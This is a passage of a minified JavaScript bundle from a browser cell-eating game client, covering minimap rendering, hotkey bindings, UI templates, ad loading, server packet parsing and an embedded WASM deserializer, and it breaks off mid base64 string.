                    },
                    drawLocationGrid(e, t) {
                        var s = o / t;
                        e.globalAlpha = .1, e.strokeStyle = "#202020", e.beginPath();
                        for (var i = 1; i < t; i++) {
                            var a = i * s;
                            e.moveTo(a, 0), e.lineTo(a, o), e.moveTo(0, a), e.lineTo(o, a)
                        }
                        e.stroke(), e.closePath()
                    },
                    drawLocationCodes(e, t) {
                        var s = o / t,
                            i = s / 2;
                        e.globalAlpha = .1, e.font = "14px Nunito", e.textAlign = "center", e.textBaseline = "middle", e.fillStyle = "#ffffff";
                        for (var a = 0; a < t; a++)
                            for (var n = a * s + i, r = 0; r < t; r++) {
                                var l = String.fromCharCode(97 + r).toUpperCase() + (a + 1),
                                    c = r * s + i;
                                e.strokeText(l, n, c), e.fillText(l, n, c)
                            }
                    },
                    drawLocations(e) {
                        e.width = e.height = o;
                        var t = e.getContext("2d"),
                            s = o / 2;
                        if (this.showLocations) {
                            if (t.save(), this.showMinimapCircle) {
                                var i = new Path2D;
                                i.ellipse(s, s, s, s, 0, 0, 2 * Math.PI), t.clip(i)
                            }
                            this.drawLocationGrid(t, 5), this.drawLocationCodes(t, 5)
                        }
                        t.restore(), this.showMinimapCircle && (t.globalAlpha = .45, t.beginPath(), t.arc(s, s, s + 1, -Math.PI / 2, 0), t.lineTo(o, 0), t.closePath(), t.fill())
                    }
                },
                created() {
                    i.events.$on("minimap-show", this.onMinimapShow), i.events.$on("minimap-hide", this.onMinimapHide), i.events.$on("minimap-destroy", this.destroyMinimap), i.events.$on("minimap-create-node", this.createNode), i.events.$on("minimap-destroy-node", this.destroyNode), i.events.$on("minimap-show-locations", e => {
                        this.showLocations = e, this.drawLocations(this.$refs.locations)
                    }), i.events.$on("minimap-stats-visible", e => this.showMinimapStats = e), i.events.$on("minimap-stats-changed", e => {
                        this.spectators = e.spectators, this.playerCount = e.playerCount
                    }), i.events.$on("restart-timing-changed", e => this.restartTick = e), i.events.$on("game-started", () => {
                        this.showMinimapCircle = i.border.circle, this.drawLocations(this.$refs.locations)
                    }), i.events.$on("game-stopped", () => this.restartTick = 0), i.events.$on("minimap-stats-invalidate-shown", () => {
                        this.showClock = n.showClock, this.showSessionTime = n.showSessionTime, this.showSpectators = n.showSpectators, this.showPlayerCount = n.showPlayerCount, this.showRestartTiming = n.showRestartTiming
                    }), i.events.$on("every-second", () => {
                        this.systemTime = d();
                        var e = (Date.now() - this.startTime) / 1e3;
                        this.sessionTime = p(e, !1), this.restartTick && i.serverTick ? (e = (this.restartTick - i.serverTick) / 25, this.restartTime = p(e, !0)) : this.restartTime = null
                    })
                },
                mounted() {
                    this.initRenderer(this.$refs.minimap), this.startTime = Date.now()
                }
            }
        }, function(e, t, s) {
            var i = s(2),
                a = s(251);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(253);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(255);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(257);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(259);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(261);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(263);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(266);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, , function(e, t, s) {
            let i = s(1),
                a = s(4),
                n = s(5),
                o = i.actions,
                r = {
                    toggleAutoRespawn() {
                        let e = a.autoRespawn;
                        a.set("autoRespawn", !e), e && i.state.autoRespawning && i.triggerAutoRespawn(!1);
                        let t = "Auto respawn ";
                        t += e ? "disabled" : "enabled", n.toast.fire({
                            type: "info",
                            title: t,
                            timer: 1500
                        })
                    },
                    respawn() {
                        o.join(i.dual.focused), i.showMenu(!1)
                    },
                    feed: o.feed.bind(o),
                    feedMacro: o.feed.bind(o, !0),
                    split: o.split.bind(o, 1),
                    splitx2: o.split.bind(o, 2),
                    splitx3: o.split.bind(o, 3),
                    splitMax: o.split.bind(o, 4),
                    split32: o.split.bind(o, 5),
                    split64: o.split.bind(o, 6),
                    split128: o.split.bind(o, 7),
                    split256: o.split.bind(o, 8),
                    multi1: o.multicombo.bind(o, 1),
                    multi2: o.multicombo.bind(o, 2),
                    multi3: o.multicombo.bind(o, 3),
                    linesplit: o.linesplit.bind(o),
                    freezeMouse: o.freezeMouse.bind(o),
                    lockLinesplit: o.lockLinesplit.bind(o),
                    stopMovement: o.stopMovement.bind(o),
                    toggleSkins: o.toggleSkins.bind(o),
                    toggleNames: o.toggleNames.bind(o),
                    toggleFood: o.toggleFood.bind(o),
                    toggleMass: o.toggleMass.bind(o),
                    toggleChat: o.toggleChat.bind(o),
                    toggleChatToast: o.toggleChatToast.bind(o),
                    toggleHud: o.toggleHud.bind(o),
                    spectateLock: o.spectateLockToggle.bind(o),
                    selectPlayer: o.targetPlayer.bind(o),
                    saveReplay() {
                        let {
                            dual: e
                        } = i;
                        i.replay.save(e.focused)
                    },
                    zoomLevel1: o.setZoomLevel.bind(o, 1),
                    zoomLevel2: o.setZoomLevel.bind(o, 2),
                    zoomLevel3: o.setZoomLevel.bind(o, 3),
                    zoomLevel4: o.setZoomLevel.bind(o, 4),
                    zoomLevel5: o.setZoomLevel.bind(o, 5),
                    multibox() {
                        let {
                            dual: e
                        } = i;
                        e.switch()
                    }
                };
            window.client && Object.assign(r, {
                "m-feed": client.feed.bind(client),
                "m-feedMacro": client.feed.bind(client, !0),
                "m-split": client.split.bind(client, 1),
                "m-splitx2": client.split.bind(client, 2),
                "m-splitx3": client.split.bind(client, 3),
                "m-splitMax": client.split.bind(client, 4),
                "m-split32": client.split.bind(client, 5),
                "m-split64": client.split.bind(client, 6),
                "m-linesplit": client.lineSplit.bind(client),
                "m-stopMovement": client.toggleMovement.bind(client),
                "m-respawn": client.spawn.bind(client),
                "m-focus": client.focus.bind(client, !0),
                "m-unfocus": client.focus.bind(client, !1)
            });
            let l = {
                multibox: "TAB",
                feed: "",
                feedMacro: "W",
                split: "SPACE",
                splitx2: "G",
                splitx3: "H",
                splitMax: "T",
                split32: "",
                split64: "",
                split128: "",
                split256: "",
                multi1: "",
                multi2: "",
                multi3: "",
                linesplit: "Z",
                lockLinesplit: "",
                respawn: "",
                toggleAutoRespawn: "",
                stopMovement: "",
                toggleSkins: "",
                toggleNames: "",
                toggleMass: "",
                spectateLock: "Q",
                selectPlayer: "MOUSE1",
                saveReplay: "R",
                toggleChat: "",
                toggleChatToast: "",
                toggleHud: "",
                zoomLevel1: "1",
                zoomLevel2: "2",
                zoomLevel3: "3",
                zoomLevel4: "4",
                zoomLevel5: "5"
            };
            e.exports = i.hotkeyManager = new class e {
                constructor() {
                    this.version = 2, this.pressHandlers = null, this.releaseHandlers = null, this.resetObsoleteHotkeys(), this.load()
                }
                resetObsoleteHotkeys() {}
                load() {
                    this.hotkeys = this.loadHotkeys(), this.loadHandlers(this.hotkeys)
                }
                loadHotkeys() {
                    let e = Object.assign({}, l),
                        t = localStorage.hotkeys;
                    if (!t) return e;
                    t = JSON.parse(t);
                    let s = Object.values(t);
                    return Object.keys(e).forEach(t => {
                        let i = e[t];
                        i && s.includes(i) && (e[t] = "")
                    }), Object.assign(e, t)
                }
                saveHotkeys(e) {
                    localStorage.hotkeys = JSON.stringify(e)
                }
                reset() {
                    return localStorage.removeItem("hotkeys"), this.load(), this.hotkeys
                }
                get() {
                    return this.hotkeys
                }
                set(e, t) {
                    if (!(e in r)) return !1;
                    if (this.hotkeys[e] === t) return !0;
                    if (t)
                        for (let s in this.hotkeys) this.hotkeys[s] === t && (this.hotkeys[s] = "");
                    return this.hotkeys[e] = t, this.saveHotkeys(this.hotkeys), this.loadHandlers(this.hotkeys), !0
                }
                loadHandlers(e) {
                    for (let t in this.pressHandlers = {}, e) {
                        if (!(t in r)) continue;
                        let s = r[t],
                            i = e[t];
                        this.pressHandlers[i] = s
                    }
                    this.releaseHandlers = {}, "feedMacro" in e && (this.releaseHandlers[e.feedMacro] = o.feed.bind(o, !1)), window.client && "m-feedMacro" in e && (this.releaseHandlers[e["m-feedMacro"]] = client.feed.bind(o, !1))
                }
                press(e) {
                    let t = this.pressHandlers[e];
                    return !!t && (t(), !0)
                }
                release(e) {
                    let t = this.releaseHandlers[e];
                    t?.()
                }
                convertKey(e) {
                    return e ? e.toString().toUpperCase().replace(/^(LEFT|RIGHT|NUMPAD|DIGIT|KEY)/, "") : "Unknown"
                }
            }
        }, , , , , , , function(e, t, s) {
            "use strict";
            var i = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return t("div", [t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showMinimapStats,
                            expression: "showMinimapStats"
                        }],
                        staticClass: "minimap-stats",
                        style: {
                            bottom: this.minimapStatsBottom + "px"
                        }
                    }, [t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showClock,
                            expression: "showClock"
                        }]
                    }, [this._v(this._s(this.systemTime))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showSessionTime,
                            expression: "showSessionTime"
                        }]
                    }, [this._v(this._s(this.sessionTime) + " session")]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showPlayerCount && this.playerCount,
                            expression: "showPlayerCount && playerCount"
                        }]
                    }, [this._v(this._s(this.playerCountDisplayed))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showSpectators && this.spectators,
                            expression: "showSpectators && spectators"
                        }]
                    }, [this._v(this._s(this.spectators) + " spectator" + this._s(1 === this.spectators ? "" : "s"))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showRestartTiming && this.restartTime,
                            expression: "showRestartTiming && restartTime"
                        }]
                    }, [this._v("Restart in " + this._s(this.restartTime))])]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showMinimap,
                            expression: "showMinimap"
                        }],
                        staticClass: "container",
                        class: {
                            circle: this.showMinimapCircle
                        }
                    }, [t("canvas", {
                        ref: "locations",
                        attrs: {
                            id: "locations"
                        }
                    }), this._v(" "), t("canvas", {
                        ref: "minimap",
                        attrs: {
                            id: "minimap"
                        }
                    })])])
                },
                a = [];
            i._withStripped = !0, s.d(t, "a", function() {
                return i
            }), s.d(t, "b", function() {
                return a
            })
        }, function(e, t, s) {
            "use strict";
            var i = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("transition", {
                        attrs: {
                            name: "fade",
                            appear: ""
                        }
                    }, [s("div", {
                        staticClass: "modal"
                    }, [s("div", {
                        staticClass: "overlay",
                        on: {
                            click: function() {
                                return e.$emit("close")
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "fas fa-times-circle close-button",
                        on: {
                            click: function() {
                                return e.$emit("close")
                            }
                        }
                    }), e._v(" "), s("div", {
                        staticClass: "wrapper"
                    }, [s("transition", {
                        attrs: {
                            name: "scale",
                            appear: ""
                        }
                    }, [s("div", {
                        staticClass: "content fade-box"
                    }, [e._t("default", [e._v("Here should be something")])], 2)])], 1)])])
                },
                a = [];
            i._withStripped = !0, s.d(t, "a", function() {
                return i
            }), s.d(t, "b", function() {
                return a
            })
        }, function(e, t, s) {
            "use strict";
            var i = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticClass: "replay-item",
                        style: {
                            backgroundImage: "url('" + e.replay.image + "')"
                        },
                        on: {
                            click: function() {
                                return e.play(e.replay.data)
                            }
                        }
                    }, [s("div", {
                        staticClass: "replay-header",
                        on: {
                            click: function(e) {
                                e.stopPropagation()
                            }
                        }
                    }, [s("div", {
                        staticClass: "replay-name"
                    }, [e._v(e._s(e.replay.name))]), e._v(" "), s("div", [s("i", {
                        staticClass: "replay-button fas fa-cloud-download-alt",
                        on: {
                            click: function(t) {
                                return t.stopPropagation(), e.downloadReplay(e.replay)
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "replay-button fas fa-trash-alt",
                        on: {
                            click: function(t) {
                                return t.stopPropagation(), e.deleteReplay(e.replay.name)
                            }
                        }
                    })])])])
                },
                a = [];
            i._withStripped = !0, s.d(t, "a", function() {
                return i
            }), s.d(t, "b", function() {
                return a
            })
        }, function(e, t) {
            t.neon = [16776960, 65280, 65535, 16711935], t.basic = [16711680, 16744448, 16776960, 8453888, 65280, 65408, 65535, 33023, 8388863, 16711935, 16711808], t.basicd = t.basic.map(e => {
                var t = e >> 16 & 255,
                    s = e >> 8 & 255,
                    i = 255 & e;
                return (t *= .5) << 16 | (s *= .5) << 8 | (i *= .5) >> 0
            })
        }, function(e) {
            var t = new class {
                constructor() {
                    this.ads = {}
                }
                addAd(e, t, s) {
                    this.ads[e] = {
                        elementId: t,
                        lastRefresh: 0,
                        waitInterval: s || 0
                    }
                }
                getAd(e) {
                    return this.ads[e] || null
                }
                pushAd(e) {
                    aiptag.cmd.display.push(function() {
                        aipDisplayTag.display(e)
                    })
                }
                refreshAd(e) {
                    var t = this.getAd(e);
                    if (!t) return !1;
                    var s = Date.now();
                    return !(t.lastRefresh + 1e3 * t.waitInterval > s) && (t.lastRefresh = s, this.pushAd(t.elementId), !0)
                }
            };
            t.addAd("menu-box", "vanis-io_300x250", 30), t.addAd("menu-banner", "vanis-io_728x90", 120), t.addAd("death-box", "vanis-io_300x250_2", 30), e.exports = {
                loadAdinplay(e) {
                    var t = window.aiptag = t || {};
                    t.cmd = t.cmd || [], t.cmd.display = t.cmd.display || [], t.gdprShowConsentTool = !0;
                    var s = document.createElement("script");
                    s.onload = e, s.src = "//api.adinplay.com/libs/aiptag/pub/VAN/vanis.io/tag.min.js", document.head.appendChild(s)
                },
                refreshAd: e => t.refreshAd(e)
            }
        }, function(e) {
            let t = e => {
                let t = {
                    border: {},
                    food: {}
                };
                if (t.protocol = e.readUInt8(), t.protocol >= 4) {
                    t.gamemodeId = e.readUInt8(), t.instanceSeed = e.readUInt16LE(), t.playerId = e.readUInt16LE(), t.border.minx = e.readInt16LE(), t.border.miny = e.readInt16LE(), t.border.maxx = e.readInt16LE(), t.border.maxy = e.readInt16LE(), t.flags = e.readUInt8(), t.border.circle = !!(1 & t.flags), t.border.width = t.border.maxx - t.border.minx, t.border.height = t.border.maxy - t.border.miny;
                    let {
                        food: s
                    } = t;
                    if (2 & t.flags) {
                        let i = s.minSize = e.readUInt16LE(),
                            a = s.maxSize = e.readUInt16LE();
                        s.stepSize = a - i
                    }
                    4 & t.flags && (s.ejectedSize = e.readUInt16LE())
                } else {
                    if (t.protocol >= 2) t.gamemodeId = e.readUInt8(), t.instanceSeed = e.readUInt16LE(), t.playerId = e.readUInt16LE(), t.border.width = e.readUInt32LE(), t.border.height = e.readUInt32LE();
                    else {
                        t.gamemodeId = 1, t.instanceSeed = e.readInt16LE(), t.playerId = e.readInt16LE();
                        let n = e.readUInt16LE();
                        t.border.width = n, t.border.height = n
                    }
                    t.border.minx = -t.border.width / 2, t.border.miny = -t.border.height / 2, t.border.maxx = +t.border.width / 2, t.border.maxy = +t.border.height / 2
                }
                return t.border.x = (t.border.minx + t.border.maxx) / 2, t.border.y = (t.border.miny + t.border.maxy) / 2, t
            };
            e.exports = t
        }, function(e, t, s) {
            let i = s(1),
                a = s(4),
                {
                    PlayerCell: n,
                    Virus: o,
                    EjectedMass: r,
                    Food: l,
                    Crown: c,
                    DeadCell: h
                } = s(133),
                d = s(14),
                {
                    clampNumber: p
                } = s(8);
            class u extends d {
                constructor(e) {
                    e.texture = PIXI.Texture.from("/img/coin.png"), super(e)
                }
            }
            u.prototype.type = 9, u.prototype.isCoin = !0;
            let g = (e, t, s, a, d, p, g, A, m = 1) => {
                    let v = 15 & e;
                    if ((3 == v || 4 == v) && (void 0 == a || void 0 == p)) {
                        let {
                            food: f
                        } = i, C = p = 3 == v ? f.ejectedSize || 1 : f.minSize + s % f.stepSize || 1;
                        if (4 == v) {
                            let {
                                border: y
                            } = i;
                            a = y.minx + C + (y.width - 2 * C) * i.seededRandom(65536 + s), d = y.miny + C + (y.height - 2 * C) * i.seededRandom(131072 + s)
                        }
                    }
                    let {
                        dual: w
                    } = i, {
                        cells: I
                    } = 1 & m ? i : w, k;
                    if (I.has(s))(k = I.get(s)).update(), k.ox = k.x, k.oy = k.y, k.oSize = k.size;
                    else {
                        let b = {
                                type: e,
                                id: s,
                                pid: t,
                                x: a,
                                y: d,
                                size: p,
                                flags: g,
                                context: m
                            },
                            _ = !1;
                        if (w.opened) {
                            let {
                                cells: S
                            } = 2 & m ? i : w;
                            if (S.has(s)) {
                                if (1 != v) return;
                                k = S.get(s), k.activeContexts++, I.set(s, k), _ = !0
                            }
                        }
                        switch (v) {
                            case 1: {
                                if (_) break;
                                let E = i.playerManager.getPlayer(t);
                                if (!E) return;
                                b.texture = E.texture, k = new n(b, E);
                                break
                            }
                            case 2:
                                k = new o(b);
                                break;
                            case 3:
                                k = new r(b);
                                break;
                            case 4:
                                k = new l(b);
                                break;
                            case 6:
                                k = new c(b);
                                break;
                            case 9:
                                k = new u(b);
                                break;
                            default: {
                                let x = 4210752,
                                    B = !1;
                                g > 1 && (x = 0, 128 & g && (x |= 7340032), 64 & g && (x |= 28672), 32 & g && (x |= 112), 16 & g && (B = !0)), k = new h(b, x, B)
                            }
                        }
                        if (!_) {
                            let {
                                scene: Q
                            } = i;
                            Q[1 & g ? "addFood" : "addCell"](k.sprite)
                        }
                        I.set(s, k)
                    }
                    void 0 != a && (k.nx = a, k.ny = d), void 0 != p && (k.nSize = p), k.updateStamp = i.timeStamp;
                    let {
                        player: M
                    } = k;
                    if (!M || 2 & m) return;
                    let {
                        replay: T
                    } = i;
                    T.recording() ? M.lastUpdateTick = A : delete M.lastUpdateTick
                },
                A = (e, t, s) => {
                    let {
                        cells: n
                    } = 1 & s ? i : i.dual;
                    if (!n.has(e)) return;
                    let o = n.get(e);
                    if (o.destroyed) return;
                    if (!n.has(t)) return void o.destroy(s);
                    let r = n.get(t);
                    if (o.update(), !o.destroy(s, a.eatAnimation)) return;
                    o.nx = r.nx, o.ny = r.ny;
                    let l = o.nSize;
                    o.nSize = 0, o.newPositionScale = p(l / r.nSize, 0, 1), o.updateStamp = i.timeStamp
                },
                m = (e, t) => {
                    let {
                        cells: s
                    } = 1 & t ? i : i.dual;
                    s.has(e) && s.get(e).destroy(t)
                },
                v = new class e {
                    async init() {
                        if (this.initializing || this.instance) return !1;
                        this.initializing = !0;
                        let e = await fetch("data:application/wasm;base64,AGFzbQEAAAABKAdgAX8Bf2ABfwBgA39/fwBgAAF/YAAAYAJ/fwBgCX9/f39/f39/fwACUQQDZW52C2FkZE9yVXBkYXRlAAYDZW52B2Rlc3Ryb3kABQNlbnYDZWF0AAIDZW52H2Vtc2NyaXB0ZW5fbm90aWZ5X21lbW9yeV9ncm93dGgAAQMLCgQCAwAAAAEDAQAEBQFwAQICBQcBAYACgIACBgkBfwFBgIzAAgsHjQEKBm1lbW9yeQIAC2Rlc2VyaWFsaXplAAULX2luaXRpYWxpemUABBlfX2luZGlyZWN0X2Z1bmN0aW9uX3RhYmxlAQAQX19lcnJub19sb2NhdGlvbgAGCXN0YWNrU2F2ZQALDHN0YWNrUmVzdG9yZQAMCnN0YWNrQWxsb2MADQZtYWxsb2MACQRmcmVlAAoJBwEAQQELAQQKjT8KAwABC6oEAQt/QQEhAyAALQAAIgYEQANAIAZB/wFxIQhBACEKAkAgBkEfcUEBRwRAQQAhCwwBCyAAIAVqLQACIAAgA2otAABBCHRyIQsgBUEDaiEDCyAAIANqIgUvAAAhByADQQJqIQQCQCAIQSBxBEBBACEMDAELIAUtAAMgACAEai0AAEEIdHIhCiAFLwAEIgRBCHQgBEEIdnIhDCADQQZqIQQLIAdBCHYhBSAHQQh0IQlBACEDAkAgCEHAAHEEQEEAIQcMAQsgACAEai8AACIHQQh0IAdBCHZyIQcgBEECaiEECyAGQQ9xIQ0gBSAJciEJIAZBGHRBGHVBf0oEfyAEBSAAIARqLQAAIQMgBEEBagshBSACIAggCyAJQf//A3EgCkEQdEEQdSAMQRB0QRB1IAdB//8DcSADIA1BBEYgA0H/AXFBD0tyckH/AXEgARAAIAVBAWohAyAAIAVqLQAAIgYNAAsLIANBAmohBAJAIAAgBWotAAIgACADai0AAEEIdHIiBUUEQCADIQYMAQsDQCACIAAgA2otAAMgACAEIgZqLQAAQQh0chABIARBAmohBCAGIQMgBUEBayIFQf//A3ENAAsLIAAgBmotAAMgACAEai0AAEEIdHIiAwRAA0AgACAGaiEBIAIgACAGQQRqIgZqLwAAIgRBCHQgBEEIdnJB//8DcSABLwAGIgFBCHQgAUEIdnJB//8DcRACIANBAWsiA0H//wNxDQALCwsFAEGECAsjACAAPwBBEHRrQf//A2pBEHZAAEF/RgRAQQAPC0EAEANBAQtSAQJ/QYAIKAIAIgEgAEEDakF8cSICaiEAAkAgAkEBTkEAIAAgAU0bDQA/AEEQdCAASQRAIAAQB0UNAQtBgAggADYCACABDwtBhAhBMDYCAEF/C5ctAQx/IwBBEGsiDCQAAkACQAJAAkACQAJAAkACQAJAAkACQAJAIABB9AFNBEBBiAgoAgAiBUEQIABBC2pBeHEgAEELSRsiCEEDdiICdiIBQQNxBEAgAUF/c0EBcSACaiIDQQN0IgFBuAhqKAIAIgRBCGohAAJAIAQoAggiAiABQbAIaiIBRgRAQYgIIAVBfiADd3E2AgAMAQsgAiABNgIMIAEgAjYCCAsgBCADQQN0IgFBA3I2AgQgASAEaiIBIAEoAgRBAXI2AgQMDQsgCEGQCCgCACIKTQ0BIAEEQAJAQQIgAnQiAEEAIABrciABIAJ0cSIAQQAgAGtxQQFrIgAgAEEMdkEQcSICdiIBQQV2QQhxIgAgAnIgASAAdiIBQQJ2QQRxIgByIAEgAHYiAUEBdkECcSIAciABIAB2IgFBAXZBAXEiAHIgASAAdmoiA0EDdCIAQbgIaigCACIEKAIIIgEgAEGwCGoiAEYEQEGICCAFQX4gA3dxIgU2AgAMAQsgASAANgIMIAAgATYCCAsgBEEIaiEAIAQgCEEDcjYCBCAEIAhqIgIgA0EDdCIBIAhrIgNBAXI2AgQgASAEaiADNgIAIAoEQCAKQQN2IgFBA3RBsAhqIQdBnAgoAgAhBAJ/IAVBASABdCIBcUUEQEGICCABIAVyNgIAIAcMAQsgBygCCAshASAHIAQ2AgggASAENgIMIAQgBzYCDCAEIAE2AggLQZwIIAI2AgBBkAggAzYCAAwNC0GMCCgCACIGRQ0BIAZBACAGa3FBAWsiACAAQQx2QRBxIgJ2IgFBBXZBCHEiACACciABIAB2IgFBAnZBBHEiAHIgASAAdiIBQQF2QQJxIgByIAEgAHYiAUEBdkEBcSIAciABIAB2akECdEG4CmooAgAiASgCBEF4cSAIayEDIAEhAgNAAkAgAigCECIARQRAIAIoAhQiAEUNAQsgACgCBEF4cSAIayICIAMgAiADSSICGyEDIAAgASACGyEBIAAhAgwBCwsgASAIaiIJIAFNDQIgASgCGCELIAEgASgCDCIERwRAIAEoAggiAEGYCCgCAEkaIAAgBDYCDCAEIAA2AggMDAsgAUEUaiICKAIAIgBFBEAgASgCECIARQ0EIAFBEGohAgsDQCACIQcgACIEQRRqIgIoAgAiAA0AIARBEGohAiAEKAIQIgANAAsgB0EANgIADAsLQX8hCCAAQb9/Sw0AIABBC2oiAEF4cSEIQYwIKAIAIglFDQBBHyEFQQAgCGshAwJAAkACQAJ/IAhB////B00EQCAAQQh2IgAgAEGA/j9qQRB2QQhxIgJ0IgAgAEGA4B9qQRB2QQRxIgF0IgAgAEGAgA9qQRB2QQJxIgB0QQ92IAEgAnIgAHJrIgBBAXQgCCAAQRVqdkEBcXJBHGohBQsgBUECdEG4CmooAgAiAkULBEBBACEADAELQQAhACAIQQBBGSAFQQF2ayAFQR9GG3QhAQNAAkAgAigCBEF4cSAIayIHIANPDQAgAiEEIAciAw0AQQAhAyACIQAMAwsgACACKAIUIgcgByACIAFBHXZBBHFqKAIQIgJGGyAAIAcbIQAgAUEBdCEBIAINAAsLIAAgBHJFBEBBAiAFdCIAQQAgAGtyIAlxIgBFDQMgAEEAIABrcUEBayIAIABBDHZBEHEiAnYiAUEFdkEIcSIAIAJyIAEgAHYiAUECdkEEcSIAciABIAB2IgFBAXZBAnEiAHIgASAAdiIBQQF2QQFxIgByIAEgAHZqQQJ0QbgKaigCACEACyAARQ0BCwNAIAAoAgRBeHEgCGsiASADSSECIAEgAyACGyEDIAAgBCACGyEEIAAoAhAiAQR/IAEFIAAoAhQLIgANAAsLIARFDQAgA0GQCCgCACAIa08NACAEIAhqIgYgBE0NASAEKAIYIQUgBCAEKAIMIgFHBEAgBCgCCCIAQZgIKAIASRogACABNgIMIAEgADYCCAwKCyAEQRRqIgIoAgAiAEUEQCAEKAIQIgBFDQQgBEEQaiECCwNAIAIhByAAIgFBFGoiAigCACIADQAgAUEQaiECIAEoAhAiAA0ACyAHQQA2AgAMCQsgCEGQCCgCACICTQRAQZwIKAIAIQMCQCACIAhrIgFBEE8EQEGQCCABNgIAQZwIIAMgCGoiADYCACAAIAFBAXI2AgQgAiADaiABNgIAIAMgCEEDcjYCBAwBC0GcCEEANgIAQZAIQQA2AgAgAyACQQNyNgIEIAIgA2oiACAAKAIEQQFyNgIECyADQQhqIQAMCwsgCEGUCCgCACIGSQRAQZQIIAYgCGsiATYCAEGgCEGgCCgCACICIAhqIgA2AgAgACABQQFyNgIEIAIgCEEDcjYCBCACQQhqIQAMCwtBACEAIAhBL2oiCQJ/QeALKAIABEBB6AsoAgAMAQtB7AtCfzcCAEHkC0KAoICAgIAENwIAQeALIAxBDGpBcHFB2KrVqgVzNgIAQfQLQQA2AgBBxAtBADYCAEGAIAsiAWoiBUEAIAFrIgdxIgIgCE0NCkHACygCACIEBEBBuAsoAgAiAyACaiIBIANNDQsgASAESw0LC0HECy0AAEEEcQ0FAkACQEGgCCgCACIDBEBByAshAANAIAMgACgCACIBTwRAIAEgACgCBGogA0sNAwsgACgCCCIADQALC0EAEAgiAUF/Rg0GIAIhBUHkCygCACIDQQFrIgAgAXEEQCACIAFrIAAgAWpBACADa3FqIQULIAUgCE0NBiAFQf7///8HSw0GQcALKAIAIgQEQEG4CygCACIDIAVqIgAgA00NByAAIARLDQcLIAUQCCIAIAFHDQEMCAsgBSAGayAHcSIFQf7///8HSw0FIAUQCCIBIAAoAgAgACgCBGpGDQQgASEACwJAIAhBMGogBU0NACAAQX9GDQBB6AsoAgAiASAJIAVrakEAIAFrcSIBQf7///8HSwRAIAAhAQwICyABEAhBf0cEQCABIAVqIQUgACEBDAgLQQAgBWsQCBoMBQsgACIBQX9HDQYMBAsAC0EAIQQMBwtBACEBDAULIAFBf0cNAgtBxAtBxAsoAgBBBHI2AgALIAJB/v///wdLDQEgAhAIIgFBABAIIgBPDQEgAUF/Rg0BIABBf0YNASAAIAFrIgUgCEEoak0NAQtBuAtBuAsoAgAgBWoiADYCAEG8CygCACAASQRAQbwLIAA2AgALAkACQAJAQaAIKAIAIgcEQEHICyEAA0AgASAAKAIAIgMgACgCBCICakYNAiAAKAIIIgANAAsMAgtBmAgoAgAiAEEAIAAgAU0bRQRAQZgIIAE2AgALQQAhAEHMCyAFNgIAQcgLIAE2AgBBqAhBfzYCAEGsCEHgCygCADYCAEHUC0EANgIAA0AgAEEDdCIDQbgIaiADQbAIaiICNgIAIANBvAhqIAI2AgAgAEEBaiIAQSBHDQALQZQIIAVBKGsiA0F4IAFrQQdxQQAgAUEIakEHcRsiAGsiAjYCAEGgCCAAIAFqIgA2AgAgACACQQFyNgIEIAEgA2pBKDYCBEGkCEHwCygCADYCAAwCCyABIAdNDQAgAyAHSw0AIAAoAgxBCHENACAAIAIgBWo2AgRBoAggB0F4IAdrQQdxQQAgB0EIakEHcRsiAGoiAjYCAEGUCEGUCCgCACAFaiIBIABrIgA2AgAgAiAAQQFyNgIEIAEgB2pBKDYCBEGkCEHwCygCADYCAAwBC0GYCCgCACABSwRAQZgIIAE2AgALIAEgBWohAkHICyEAAkACQAJAAkACQAJAA0AgAiAAKAIARwRAIAAoAggiAA0BDAILCyAALQAMQQhxRQ0BC0HICyEAA0AgByAAKAIAIgJPBEAgAiAAKAIEaiIEIAdLDQMLIAAo